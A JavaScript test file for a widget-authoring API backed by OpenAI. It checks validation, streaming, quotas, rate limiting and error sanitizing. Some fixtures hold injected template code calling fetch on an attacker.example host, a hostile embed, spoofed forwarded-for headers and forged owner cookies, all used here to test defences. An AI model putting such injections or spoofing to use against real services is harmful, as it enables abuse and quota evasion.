import assert from "node:assert/strict";
import { Readable } from "node:stream";
import { test } from "node:test";
import handler from "../api/author-widget.js";

let clientId = 0;
const widget = {
  template: '<Card><Text value={title} /></Card>',
  data: { title: "API smoke test" },
  theme: "light",
  designSpec: "A compact status card."
};

async function request({ method = "POST", body = {}, rawBody, headers = {}, ip = `192.0.2.${++clientId}` } = {}) {
  const req = Readable.from([Buffer.from(rawBody ?? JSON.stringify(body))]);
  req.method = method;
  req.socket = { remoteAddress: ip };
  req.headers = {
    "content-type": "application/json",
    ...headers
  };
  const response = { headers: {}, text: "", ended: false };
  const res = {
    statusCode: 200,
    setHeader(name, value) { response.headers[name.toLowerCase()] = value; },
    write(chunk) { response.text += chunk; },
    end(chunk = "") { response.text += chunk; response.ended = true; }
  };
  await handler(req, res);
  assert.equal(response.ended, true, "the handler must finish the response");
  return { ...response, status: res.statusCode };
}

function configureGeneration(t) {
  const values = {
    OPENAI_API_KEY: "test-only-key",
    UPSTASH_REDIS_REST_URL: "https://quota.example.test",
    UPSTASH_REDIS_REST_TOKEN: "quota-test-token",
    WIDGET_QUOTA_SECRET: "test-only-secret-at-least-32-characters",
    VERCEL: "0"
  };
  const previous = Object.fromEntries(Object.keys(values).map((key) => [key, process.env[key]]));
  Object.assign(process.env, values);
  t.after(() => {
    for (const [key, value] of Object.entries(previous)) {
      if (value === undefined) delete process.env[key];
      else process.env[key] = value;
    }
  });
}

function mockResponses(t, outputs, quotaResult) {
  configureGeneration(t);
  const calls = [];
  let admitted = false;
  t.mock.method(globalThis, "fetch", async (url, options) => {
    if (url === "https://quota.example.test/") {
      assert.equal(options.headers.authorization, "Bearer quota-test-token");
      assert.equal(JSON.parse(options.body)[0], "EVAL");
      assert.equal(admitted, false, "quota is consumed only once per generation");
      admitted = true;
      const now = Date.now();
      return Response.json({ result: quotaResult || [1, 2, now + 86_400_000, now] });
    }
    assert.equal(admitted, true, "quota must be admitted before every OpenAI call");
    assert.equal(url, "https://api.openai.com/v1/responses");
    assert.equal(options.method, "POST");
    assert.equal(options.headers.authorization, "Bearer test-only-key");
    calls.push(JSON.parse(options.body));
    assert.ok(outputs.length, "unexpected upstream request");
    const output = outputs.shift();
    if (output instanceof Response) return output;
    return Response.json({
      output: [{ type: "message", content: [{ type: "output_text", text: JSON.stringify(output) }] }]
    });
  });
  t.after(() => assert.equal(outputs.length, 0, "all expected upstream calls must run"));
  return calls;
}

test("author API rejects invalid requests before contacting OpenAI", async (t) => {
  t.mock.method(globalThis, "fetch", () => assert.fail("invalid requests must not reach OpenAI"));
  const method = await request({ method: "GET" });
  assert.equal(method.status, 405);
  assert.equal(method.headers.allow, "POST");

  for (const contentType of ["text/plain", "application/x-www-form-urlencoded", "multipart/form-data"]) {
    assert.equal((await request({ headers: { "content-type": contentType } })).status, 415);
  }
  for (const options of [
    { rawBody: "{" },
    { body: {} },
    { body: { prompt: "x".repeat(2001) } },
    { body: { prompt: "Status card", model: "invalid model!" } },
    { body: { prompt: "Status card", referenceImages: [{ dataUrl: "data:image/svg+xml;base64,PHN2Zy8+" }] } }
  ]) {
    assert.equal((await request(options)).status, 400);
  }
});

test("author API returns a validated widget as JSON", async (t) => {
  const calls = mockResponses(t, [{ webSearches: [], imageSearches: [] }, widget]);
  const response = await request({ body: { prompt: "A simple status card" } });
  assert.equal(response.status, 200);
  assert.match(response.headers["content-type"], /application\/json/);
  const result = JSON.parse(response.text);
  assert.deepEqual(result, { ...widget, stages: result.stages });
  assert.equal(result.stages.at(-1), "Widget ready");
  assert.ok(Number(response.headers["x-ratelimit-remaining"]) >= 0);
  assert.equal(response.headers["x-generation-limit"], "3");
  assert.equal(response.headers["x-generation-remaining"], "2");
  assert.match(response.headers["set-cookie"], /HttpOnly/);
  assert.equal(calls[0].text.format.name, "widget_asset_plan");
  assert.equal(calls[1].text.format.name, "generated_widget");
});

for (const [name, options] of [
  ["body flag", { body: { prompt: "A simple status card", stream: true } }],
  ["Accept header", { body: { prompt: "A simple status card" }, headers: { accept: "application/x-ndjson" } }]
]) {
  test(`author API streams progress and the widget using the ${name}`, async (t) => {
    mockResponses(t, [{ webSearches: [], imageSearches: [] }, widget]);
    const response = await request(options);
    assert.equal(response.status, 200);
    assert.match(response.headers["content-type"], /application\/x-ndjson/);
    const events = response.text.trim().split("\n").map((line) => JSON.parse(line));
    assert.ok(events.some((event) => event.type === "status"));
    assert.deepEqual(events.at(-1).widget, widget);
    assert.equal(events.at(-1).type, "result");
  });
}

test("author API repairs unsafe generated templates before returning them", async (t) => {
  const unsafe = { ...widget, template: '<Card><Text value={fetch("https://attacker.example")} /></Card>' };
  const calls = mockResponses(t, [{ webSearches: [], imageSearches: [] }, unsafe, widget]);
  const response = await request({ body: { prompt: "A simple status card" } });
  assert.equal(response.status, 200);
  assert.equal(JSON.parse(response.text).template, widget.template);
  assert.equal(calls[2].text.format.name, "repaired_generated_widget");
  assert.ok(JSON.parse(calls[2].input).validationError);
});

test("author API rejects an unsafe embed when the repair is still invalid", async (t) => {
  const unsafe = { ...widget, template: '<Card><YouTubeEmbed src="https://attacker.example/embed" /></Card>' };
  mockResponses(t, [{ webSearches: [], imageSearches: [] }, unsafe, unsafe]);
  const response = await request({ body: { prompt: "A simple status card" } });
  assert.equal(response.status, 500);
  assert.equal(JSON.parse(response.text).template, undefined);
});

for (const status of [401, 429]) {
  test(`author API sanitizes upstream ${status} errors`, async (t) => {
    t.mock.method(console, "error", () => {});
    mockResponses(t, [Response.json({ error: { message: "private-upstream-details" } }, { status })]);
    const response = await request({ body: { prompt: "A simple status card" } });
    assert.equal(response.status, status === 429 ? 429 : 502);
    assert.ok(JSON.parse(response.text).error);
    assert.ok(!response.text.includes("private-upstream-details"));
    assert.ok(!response.text.includes("test-only-key"));
  });
}

test("author API ends a failed stream with a sanitized error event", async (t) => {
  t.mock.method(console, "error", () => {});
  mockResponses(t, [Response.json({ error: { message: "private-upstream-details" } }, { status: 401 })]);
  const response = await request({ body: { prompt: "A simple status card", stream: true } });
  assert.equal(response.status, 200);
  const events = response.text.trim().split("\n").map((line) => JSON.parse(line));
  assert.equal(events.at(-1).type, "error");
  assert.ok(!response.text.includes("private-upstream-details"));
});

test("author API rate limiting ignores spoofed forwarded client addresses", async (t) => {
  t.mock.method(globalThis, "fetch", () => assert.fail("empty prompts must not reach OpenAI"));
  for (let index = 0; index <= 20; index += 1) {
    const response = await request({ ip: "198.51.100.10", headers: {
      "x-vercel-forwarded-for": "rate-limit-test",
      "x-forwarded-for": `spoofed-${index}`
    } });
    assert.equal(response.status, index < 20 ? 400 : 429);
    if (index === 20) {
      assert.equal(response.headers["x-ratelimit-remaining"], "0");
      assert.ok(Number(response.headers["retry-after"]) > 0);
    }
  }
});

for (const stream of [false, true]) {
  test(`author API rejects exhausted quota before paid work or streaming (stream=${stream})`, async (t) => {
    const now = Date.now();
    mockResponses(t, [], [0, 0, now + 60_000, now]);
    const response = await request({ body: { prompt: "A status card", stream } });
    assert.equal(response.status, 429);
    assert.match(response.headers["content-type"], /application\/json/);
    assert.equal(response.headers["x-generation-remaining"], "0");
    assert.equal(response.headers["retry-after"], "60");
    assert.ok(JSON.parse(response.text).error);
    assert.equal(response.text.includes('"type":"status"'), false);
  });
}

test("author API fails closed when quota configuration is missing", async (t) => {
  configureGeneration(t);
  delete process.env.WIDGET_QUOTA_SECRET;
  t.mock.method(globalThis, "fetch", () => assert.fail("unconfigured quota must block all paid work"));
  const response = await request({ body: { prompt: "A status card" } });
  assert.equal(response.status, 503);
  assert.ok(JSON.parse(response.text).error);
});

test("author API fails closed when the quota store is unavailable", async (t) => {
  configureGeneration(t);
  t.mock.method(globalThis, "fetch", async (url) => {
    assert.equal(url, "https://quota.example.test/");
    return new Response("private-store-error", { status: 500 });
  });
  const response = await request({ body: { prompt: "A status card", stream: true } });
  assert.equal(response.status, 503);
  assert.equal(response.text.includes("private-store-error"), false);
});

test("client owner flags and a forged owner cookie cannot bypass exhausted quota", async (t) => {
  const now = Date.now();
  mockResponses(t, [], [0, 0, now + 60_000, now]);
  const response = await request({
    body: { prompt: "A status card", owner: true },
    headers: { "x-generation-owner": "true", cookie: "widget_owner=forged; __Host-widget_owner=forged" }
  });
  assert.equal(response.status, 429);
  assert.equal(response.headers["x-generation-owner"], "false");
});
